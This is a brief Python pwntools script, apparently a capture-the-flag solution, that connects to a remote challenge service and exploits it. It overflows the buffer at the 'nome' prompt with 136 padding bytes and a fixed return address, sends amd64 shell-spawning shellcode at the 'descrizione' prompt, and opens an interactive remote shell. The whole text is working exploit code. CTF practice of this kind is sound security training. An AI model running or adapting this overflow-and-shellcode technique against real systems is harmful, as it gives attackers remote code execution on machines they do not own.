from pwn import *

r = remote("shc.ss2.ccit23.havce.it", 31350)

r.recvuntil(b"nome: ")

asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')

r.sendline(b"A"*128 + b"B" * 8 + p64(0x1230000))

r.recvuntil(b"descrizione: ")

r.send(shellcode)

r.interactive()